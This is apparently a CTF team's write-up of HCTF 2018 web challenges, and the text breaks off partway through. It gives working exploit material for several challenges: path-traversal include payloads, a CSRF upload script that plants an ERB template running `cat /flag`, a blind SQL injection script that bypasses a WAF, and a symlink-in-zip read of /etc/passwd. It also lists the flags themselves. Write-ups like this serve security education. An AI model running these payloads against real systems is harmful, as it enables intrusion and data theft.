    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team: De1ta</p></blockquote><p>首先感谢杭电的师傅们为我们带来了一场精彩的CTF比赛，出题和运维的大佬们都辛苦了！</p><p>顺便打个小广告：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系ZGUxdGFAcHJvdG9ubWFpbC5jb20=</p><!-- toc --><ul><li><a href="#web">Web</a><ul><li><a href="#warmup">warmup</a></li><li><a href="#share">share</a></li><li><a href="#kzone">kzone</a></li><li><a href="#admin">admin</a></li><li><a href="#hide-and-seek">hide and seek</a></li><li><a href="#game">Game</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#the_end">the_end</a></li><li><a href="#easyexp">easyexp</a></li><li><a href="#baby-printf-ver2">baby printf ver2</a></li><li><a href="#christmas">christmas</a></li></ul></li><li><a href="#re">RE</a><ul><li><a href="#lucky-star">Lucky star</a></li><li><a href="#seven">seven</a></li><li><a href="#polishduck">PolishDuck</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#xor-game">xor game</a></li></ul></li><li><a href="#blockchain">blockchain</a><ul><li><a href="#bet2loss">bet2loss</a></li><li><a href="#ez2win">ez2win</a></li></ul></li></ul><!-- tocstop --><h1><span id="web">Web</span></h1><h2><span id="warmup">warmup</span></h2><p>参考：https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/ 在source.php可以看到源码 要使<code>emmm::checkFile($_REQUEST['file'])</code>返回true，利用?截取hint.php，利用/使<code>hint.php?</code>成为一个不存在的目录，最后include利用<code>../../</code>跳转目录读取flag。 payload: <code>hint.php?/../../../../../../../../../../../ffffllllaaaagggg</code> payload还可以：<code>index.php?file=source.php?/../../../../../../../../../../../ffffllllaaaagggg</code>一个道理 &gt; <code>hctf{e8a73a09cfdd1c9a11cca29b2bf9796f}</code></p><h2><span id="share">share</span></h2><p>打开题目，主页翻译一下可以得到这些信息</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/share_00.png"> 是个让用户分享应用的网站，并且管理员可以把应用推给某个用户</p><p>/Alphatest可以看到一个filenumber 和自己的uid</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/share_01.png"></p><p>/share 可以分享东西给管理员，猜测存在xss，context框传了个段xss代码，发现能接收到admin的请求，bot是PhantomJS/2.1.1，说明能执行js，但是开了httponly打不到cookie，猜测是要CSRF，url框传的东西好像没啥用</p><figure><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/share_02.png" alt><figcaption>enter description here</figcaption></figure><p>根据主页提示可能有源码泄漏，在robots.txt 看到了三个接口的代码</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#this terrible code</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileController</span> &lt; ApplicationController</span></span><br><span class="line">  before_action <span class="symbol">:authenticate_user!</span></span><br><span class="line">  before_action <span class="symbol">:authenticate_role</span></span><br><span class="line">  before_action <span class="symbol">:authenticate_admin</span></span><br><span class="line">  protect_from_forgery <span class="symbol">:except</span> =&gt; [<span class="symbol">:upload</span> , <span class="symbol">:share_people_test</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># post /file/upload</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">upload</span></span></span><br><span class="line">    <span class="keyword">if</span>(params[<span class="symbol">:file</span>][<span class="symbol">:myfile</span>] != <span class="literal">nil</span> &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:myfile</span>] != <span class="string">""</span>)</span><br><span class="line">      file = params[<span class="symbol">:file</span>][<span class="symbol">:myfile</span>]</span><br><span class="line">      name = Base64.decode64(file.original_filename)</span><br><span class="line">      ext = name.split(<span class="string">'.'</span>)[-<span class="number">1</span>]</span><br><span class="line">      <span class="keyword">if</span> ext == name <span class="params">||</span> ext ==<span class="literal">nil</span></span><br><span class="line">        ext=<span class="string">""</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      share = Tempfile.new(name.split(<span class="string">'.'</span>+ext)[<span class="number">0</span>],Rails.root.to_s+<span class="string">"/public/upload"</span>)</span><br><span class="line">      share.write(Base64.decode64(file.read))</span><br><span class="line">      share.close</span><br><span class="line">      File.rename(share.path,share.path+<span class="string">"."</span>+ext)</span><br><span class="line">      tmp = Sharefile.new</span><br><span class="line">      tmp.public = <span class="number">0</span></span><br><span class="line">      tmp.path = share.path</span><br><span class="line">      tmp.name = name</span><br><span class="line">      tmp.tempname= share.path.split(<span class="string">'/'</span>)[-<span class="number">1</span>]+<span class="string">"."</span>+ext</span><br><span class="line">      tmp.context = params[<span class="symbol">:file</span>][<span class="symbol">:context</span>]</span><br><span class="line">      tmp.save</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    redirect_to root_path</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># post /file/Alpha_test</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">Alpha_test</span></span></span><br><span class="line">    <span class="keyword">if</span>(params[<span class="symbol">:fid</span>] != <span class="string">""</span> &amp;&amp; params[<span class="symbol">:uid</span>] != <span class="string">""</span> &amp;&amp; params[<span class="symbol">:fid</span>] != <span class="literal">nil</span> &amp;&amp; params[<span class="symbol">:uid</span>] != <span class="literal">nil</span>)</span><br><span class="line">      fid = params[<span class="symbol">:fid</span>].to_i</span><br><span class="line">      uid = params[<span class="symbol">:uid</span>].to_i</span><br><span class="line">      <span class="keyword">if</span>(fid &gt; <span class="number">0</span> &amp;&amp; uid &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span>(Sharelist.find_by(<span class="symbol">sharefile_id:</span> fid)==<span class="literal">nil</span>)</span><br><span class="line">          <span class="keyword">if</span>(Sharelist.count(<span class="string">"user_id = ?"</span>, uid.to_s) &lt;<span class="number">5</span>)</span><br><span class="line">            share = Sharelist.new</span><br><span class="line">            share.sharefile_id = fid</span><br><span class="line">            share.user_id = uid</span><br><span class="line">            share.save</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    redirect_to(root_path)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">share_file_to_all</span></span></span><br><span class="line">    file = Sharefile.find(params[<span class="symbol">:fid</span>])</span><br><span class="line">    File.rename(file.path,Rails.root+<span class="string">"/public/download/"</span>+file.name)</span><br><span class="line">    file.public = <span class="literal">true</span></span><br><span class="line">    file.path = Rails.root+<span class="string">"/public/download/"</span>+file.name</span><br><span class="line">    file.save</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>分析一下这段代码， <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before_action <span class="symbol">:authenticate_user!</span></span><br><span class="line">before_action <span class="symbol">:authenticate_role</span></span><br><span class="line">before_action <span class="symbol">:authenticate_admin</span></span><br></pre></td></tr></table></figure></p><p>首先三个接口都是管理员才能调用</p><p>第一个接口/file/upload 能够上传文件 第二个接口/file/Alpha_test 能够分配一个文件给一个用户 第三个是把文件公开，但是没有提供外部调用路由</p><p>后面 hint1给了文件结构 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">views</span><br><span class="line">|-- devise</span><br><span class="line">|   |-- confirmations</span><br><span class="line">|   |-- mailer</span><br><span class="line">|   |-- passwords</span><br><span class="line">|   |-- registrations</span><br><span class="line">|   |   `-- new.html.erb</span><br><span class="line">|   |-- sessions</span><br><span class="line">|   |   `-- new.html.erb</span><br><span class="line">|   |-- shared</span><br><span class="line">|   `-- unlocks</span><br><span class="line">|-- file</span><br><span class="line">|-- home</span><br><span class="line">|   |-- Alphatest.erb</span><br><span class="line">|   |-- addtest.erb</span><br><span class="line">|   |-- home.erb</span><br><span class="line">|   |-- index.html.erb</span><br><span class="line">|   |-- publiclist.erb</span><br><span class="line">|   |-- share.erb</span><br><span class="line">|   `-- upload.erb</span><br><span class="line">|-- layouts</span><br><span class="line">|   |-- application.html.erb</span><br><span class="line">|   |-- mailer.html.erb</span><br><span class="line">|   `-- mailer.text.erb</span><br><span class="line">`-- recommend</span><br><span class="line">     `-- show.erb</span><br></pre></td></tr></table></figure></p><p>hint2给了一个主页的代码 <code>&lt;%= render template: "home/"+params[:page] %&gt;</code> 参考 http://blog.neargle.com/SecNewsBak/drops/Ruby%20on%20Rails%20%E5%8A%A8%E6%80%81%E6%B8%B2%E6%9F%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28CVE.html 尝试跨目录包含文件失败，应该是只能包含home目录下的文件</p><p>hint3给了ruby版本2.5.0 通过查找ruby版本号，结合robots代码，主页代码和目录结构，可以确定要利用的是这个CVE： CVE-2018-6914: Unintentional file and directory creation with directory traversal in tempfile and tmpdir 大概意思就是在Tempfile 创建文件时如果传入(../)就能创建任意目录或文件 想到可以传个文件到home下，结合主页的文件包含，即可RCE</p><p>整个思路就很清晰了： 1. CSRF 让admin调用/file/upload 接口上传带有恶意文件名的文件 2. Tmpfile漏洞使得文件生成在/views/home/目录下，但是新生成的文件名有部分是随机的 3. CSRF 调用/file/Alpha_test 接口把文件分配到自己的id下，在/Alphatest拿到生成的文件名 4. 主页文件包含，RCE</p><p>于是开始了艰难的构造payload 最后上传的payload如下： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;http://code.jquery.com/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function upload(i) &#123;</span><br><span class="line">var test=$(&apos;meta&apos;).eq(1).attr(&quot;content&quot;);</span><br><span class="line">var url=&quot;/file/upload&quot;;</span><br><span class="line">  var data=&quot;-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;file[myfile]\&quot;; filename=\&quot;Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\&quot;\x0d\x0a\</span><br><span class="line">Content-Type: application/text\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;file[context]\&quot;\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">de1ta\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;authenticity_token\&quot;\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">&quot;+test+&quot;\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;commit\&quot;\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">submit\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;utf8\&quot;\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">✓\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835--&quot;;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">   url: url,</span><br><span class="line">   type:&quot;POST&quot;,</span><br><span class="line">   headers: &#123;</span><br><span class="line">       &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------13025814701038468772945051835&quot;,</span><br><span class="line">       &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   data:data,</span><br><span class="line">   contentType:false,</span><br><span class="line">   success:function(res)&#123;</span><br><span class="line">   &#125;,</span><br><span class="line">   error:function(err)&#123;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"> &#125;</span><br><span class="line"> for(var i=1;i&lt;2;i++)</span><br><span class="line"> &#123;</span><br><span class="line">    upload(i);</span><br><span class="line"> &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>文件内容为 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= `cat /flag` %&gt;</span><br></pre></td></tr></table></figure></p><p>文件名为 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../app/views/home/de1taxishir.erbss.erb</span><br></pre></td></tr></table></figure></p><p>推送文件到我的uid下的代码为： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;http://code.jquery.com/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function go(fffid)&#123;</span><br><span class="line">  var test=$(&apos;meta&apos;).eq(1).attr(&quot;content&quot;);</span><br><span class="line">  console.log(test);</span><br><span class="line">  var params = &#123;utf8:&quot;\xE2\x9C\x93&quot;,authenticity_token:test,uid:2,fid:fffid,commit:&quot;submit&quot;&#125;;</span><br><span class="line">  var url = &apos;/file/Alpha_test&apos;;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">   url : url,</span><br><span class="line">   type : &quot;POST&quot;,</span><br><span class="line">   data : params,</span><br><span class="line">   success : function(result) &#123;</span><br><span class="line">   &#125;,</span><br><span class="line">   error:function(result)&#123;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i=1;i&lt;20;i+=1)&#123;</span><br><span class="line">  go(i);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>这里因为不知道文件id是多少，只能根据前面的filenumber来爆破一下，所以写了个for循环 最后上传上去并获取文件名后，在主页进行文件包含执行命令，读取flag</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/share_03.png"></p><p>ps：这道题有个搅shi bug，利用推文件给用户接口，无限暴力推fid到自己的uid下，就能看到别人上传的文件，并且别人就不知道他的文件名是啥了</p><p>还有就是js构造一个文件上传太坑了，一开始用new File，一直失败，后面发现是PhantomJS不支持这个h5的类好像，于是硬生生写了个multipart/form-data 出来</p><blockquote><p><code>flag:hctf{8f4c57063ddb7b106e03e25f7d1bb813}</code></p></blockquote><h2><span id="kzone">kzone</span></h2><p>打开发现是一个QQ钓鱼站，主页会跳转到空间 http://kzone.2018.hctf.io/www.zip 可以下载到源码 install.sql 文件中有admin密码，admn。 INSERT INTO <code>fish_admin</code> (<code>id</code>, <code>username</code>, <code>password</code>, <code>name</code>, <code>qq</code>, <code>per</code>) VALUES (1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '小杰', '1503816935', 1); 不过登陆不上去，密码被改了</p><p>审计源码翻到了member.php，发现这边没有addslashes，并且无需登录也可访问</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/kzone_00.png"></p><p>可以看到这段代码从cookie获取了登陆信息，如果符合几个if，就能登陆 想到通过注入 ，union select 替换掉admin_user和admin_pass 尝试构造弱类型绕过： <code>Cookie: PHPSESSID=s33h9c1u8bq5t0r8s4dura0c76; islogin=1; login_data={"admin_user":"admin'||'1","admin_pass":65}</code> （一开始没构造出来，然后就转思路去bypass waf了</p><p>参考这篇文章 http://blog.sina.com.cn/s/blog_1574497330102wruv.html 虽然他没绕过关键词检测，但是顺着他的思路尝试构造了 ，本地测试发现json_decode后变为union，成功bypass waf 构造一个sleep的cookie，放到服务端测试也sleep了，证明此处注入可行 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:PHPSESSID=t0k91etf5fecbi4t25d7hprtm3;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;admin111&apos;/**/\u0075nion/**/select/**/1,2,3,4,5,6/**/from/**/fish_admin/**/where/**/\u0073leep(3)\u003d&apos;1&quot;,&quot;admin_pass&quot;:&quot;3b30a11aaba222edd6e704e9959b94643ed4ffd9&quot;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/kzone_01.png"></p><p>后面就把所有关键词用这种方法绕过，就能直接注入了，最后flag在 F1444g表的F1a9字段 附上注入脚本 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#!coding:utf-8#</span></span><br><span class="line"><span class="comment"># xishir</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment">#hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125;</span></span><br><span class="line"></span><br><span class="line">ss = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+"</span></span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">"http://kzone.2018.hctf.io/admin/"</span></span><br><span class="line"><span class="comment">#url="http://127.0.0.1/hctf/www/admin/"</span></span><br><span class="line"></span><br><span class="line">union = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'u'</span>)))[<span class="number">2</span>:]+<span class="string">'nion'</span></span><br><span class="line">sleep = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'s'</span>)))[<span class="number">2</span>:]+<span class="string">'leep'</span></span><br><span class="line">ascii = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'a'</span>)))[<span class="number">2</span>:]+<span class="string">'scii'</span></span><br><span class="line">ok = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'='</span>)))[<span class="number">2</span>:]</span><br><span class="line">substr = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'s'</span>)))[<span class="number">2</span>:]+<span class="string">'ubstr'</span></span><br><span class="line">over = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'#'</span>)))[<span class="number">2</span>:]</span><br><span class="line">blank = <span class="string">"/**/"</span></span><br><span class="line">orr = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'o'</span>)))[<span class="number">2</span>:]+<span class="string">'r'</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ss:</span><br><span class="line">        payload = <span class="string">"admin' and (substr((select binary F1a9 from F1444g limit 1),"</span>+str(i)+<span class="string">",1)='"</span>+str(j)+<span class="string">"') and sleep(4) and 1='1"</span></span><br><span class="line"></span><br><span class="line">        payload = payload.replace(<span class="string">'sleep'</span>,sleep)</span><br><span class="line">        payload = payload.replace(<span class="string">'union'</span>,union)</span><br><span class="line">        payload = payload.replace(<span class="string">'='</span>,ok)</span><br><span class="line">        payload = payload.replace(<span class="string">'#'</span>,over)</span><br><span class="line">        payload = payload.replace(<span class="string">' '</span>,blank)</span><br><span class="line">        payload = payload.replace(<span class="string">'ascii'</span>,ascii)</span><br><span class="line">        payload = payload.replace(<span class="string">'substr'</span>,substr)</span><br><span class="line">        payload = payload.replace(<span class="string">'or'</span>,orr)</span><br><span class="line"></span><br><span class="line">        jsons = <span class="string">'&#123;"admin_user":"'</span>+payload+<span class="string">'","admin_pass":"3b30a11aaba222edd6e704e9959b94643ed4ffd9"&#125;'</span></span><br><span class="line"></span><br><span class="line">        cookie=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"t0k91etf5fecbi4t25d7hprtm3"</span>,</span><br><span class="line">        <span class="string">"islogin"</span>:<span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"login_data"</span>:jsons&#125;</span><br><span class="line"></span><br><span class="line">        t1=time.time()</span><br><span class="line">        r1 = r.get(<span class="string">"http://kzone.2018.hctf.io"</span>,cookies=cookie)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="comment">#print t2</span></span><br><span class="line">        <span class="keyword">if</span> (t2-t1)&gt;<span class="number">4</span>:</span><br><span class="line">            <span class="comment">#print "aaaaaaaa"</span></span><br><span class="line">            flag+=str(j)</span><br><span class="line">            <span class="keyword">print</span> i,flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><figure><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/kzone_02.png" alt><figcaption>enter description here</figcaption></figure><h2><span id="admin">admin</span></h2><p>找到源码 https://github.com/woadsl1234/hctf_flask/</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/admin_00.png"></p><p>有个进程每30秒重置一次数据库</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/admin_01.png"></p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/admin_02.png"> 看到strlower函数很奇怪 参考：http://blog.lnyas.xyz/?p=1411 最后解题步骤如下 注册一个ᴬdmin账号 登陆ᴬdmin，发现页面显示Admin 修改密码，退出登录 重新登陆Admin，看到flag <img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/admin_03.png"></p><h2><span id="hide-and-seek">hide and seek</span></h2><p>传个zip，会解压缩并且读取 尝试传个链接文件ln -s /etc/passwd test 并压缩上传 读到/etc/passwd</p><p>然后就是各种文件读取 在 /proc/self/environ读取到一个好东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=323a960bcc1aSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</span><br></pre></td></tr></table></figure><p>然后直接读/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini文件得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</span><br></pre></td></tr></table></figure><p>按部就班读取项目文件 /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 得到 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 